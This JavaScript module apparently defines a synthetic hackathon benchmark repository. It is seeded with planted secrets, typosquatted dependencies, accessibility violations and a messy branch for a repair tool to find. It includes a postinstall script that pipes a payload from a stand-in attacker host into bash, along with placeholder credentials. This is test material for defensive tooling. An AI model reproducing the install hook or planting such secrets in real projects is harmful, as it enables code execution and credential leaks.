export const TKS_SYNTHETIC_REPO = {
    owner: 'devf8rge',
    name: 'tk-s-challenge',
    fullName: 'devf8rge/tk-s-challenge',
    defaultBranch: 'main',
    branches: ['main', 'messy-changes', 'production'],
    description: 'Devf8rge Hackathon PS-08 Benchmark Repository with Seeded Security, Dependency, and Accessibility Issues',
    files: {
        main: {
            // Missing README.md, missing LICENSE, missing CONTRIBUTING.md, missing SECURITY.md
            // Missing .gitignore, missing CI workflow
            // Secrets category:
            'secrets/api-keys.env': `# Development credentials (DO NOT COMMIT)
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
GITHUB_PERSONAL_ACCESS_TOKEN=ghp_9876543210abcdef9876543210abcdef9876
OPENAI_API_KEY=sk-proj-aB99xKlmnoPQrstUVWxyZ1234567890abcdefghijklm
DATABASE_URL=postgres://postgres:SuperSecretPassword123!@db.internal:5432/app_production
SLACK_WEBHOOK_URL=https://hooks.slack.com/services/T00000000/B00000000/dummy_nonfunctional_slack_token
`,
            'secrets/config.js': `// Configuration loader
module.exports = {
  stripeSecretKey: 'sk_test_dummy_nonfunctional_stripe_secret_key',
  jwtSecret: 'super-secret-jwt-signing-token-998877',
};
`,
            // Supply chain / dependency category:
            'supply-chain/package.json': `{
  "name": "tk-s-supply-chain-demo",
  "version": "1.0.0",
  "description": "Seeded supply chain risks for Devf8rge Hackathon",
  "dependencies": {
    "express": "^4.19.2",
    "cross-envv": "^7.0.3",
    "lodas-es": "^4.17.21",
    "telemetry-agent": "file:./packages/telemetry-agent"
  }
}
`,
            'supply-chain/packages/telemetry-agent/package.json': `{
  "name": "telemetry-agent",
  "version": "0.1.0",
  "scripts": {
    "postinstall": "curl -s http://attacker-telemetry.example/payload.sh | bash || echo 'Telemetry fallback'"
  }
}
`,
            // Frontend accessibility category:
            'frontend/index.html': `<!DOCTYPE html>
<html>
<head>
  <title>Customer Portal</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="header">
    <img src="/logo.png">
    <button class="nav-toggle">
      <svg width="24" height="24" viewBox="0 0 24 24"><path d="M3 12h18M3 6h18M3 18h18"/></svg>
    </button>
  </div>

  <main>
    <div class="hero-banner">
      <h2 class="sub-text">Welcome to our Enterprise System</h2>
    </div>

    <form class="login-form">
      <div>
        <input type="text" id="user-email" placeholder="Enter username">
      </div>
      <div>
        <input type="password" id="user-pass" placeholder="Enter password">
      </div>
      <button type="submit">Sign In</button>
    </form>
  </main>
</body>
</html>
`,
            'frontend/styles.css': `/* Low contrast text violation: #888888 on #777777 has contrast ratio 1.25:1 (WCAG requires 4.5:1) */
.sub-text {
  color: #888888;
  background-color: #777777;
  font-size: 14px;
}

.hero-banner {
  background-color: #777777;
  padding: 20px;
}

/* Another low contrast violation */
.helper-notice {
  color: #a0a0a0;
  background-color: #ffffff;
  font-size: 12px;
}
`,
            'frontend/LoginForm.jsx': `import React from 'react';

export function LoginForm() {
  return (
    <div style={{ backgroundColor: '#222222', color: '#444444' }}>
      <h3>Sign in to Dashboard</h3>
      {/* Missing accessible form label */}
      <input type="text" name="apikey" placeholder="Paste API Key here" />
      {/* Icon button without accessible name */}
      <button onClick={() => alert('Search')}>
        <i className="search-icon" />
      </button>
    </div>
  );
}
`,
            // Bare repository files:
            'src/index.js': `console.log("Repo Doctor TK-S Benchmark Target");
module.exports = { status: "active" };
`,
        },
        // 'messy-changes' branch (for Milestone 5 branch-aware repairs)
        'messy-changes': {
            'secrets/api-keys.env': `# Development credentials (DO NOT COMMIT)
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
`,
            'frontend/index.html': `<!DOCTYPE html>
<html>
<head>
  <title>Customer Portal - Work In Progress</title>
</head>
<body>
  <!-- UNFINISHED WORK IN PROGRESS -->
  <p>Temporary experimental edit on messy-changes branch</p>
</body>
</html>
`,
            'src/experimental.js': `// Experimental feature on messy-changes branch
export function experimentalFeature() {
  return 'in-progress';
}
`,
        },
    },
};
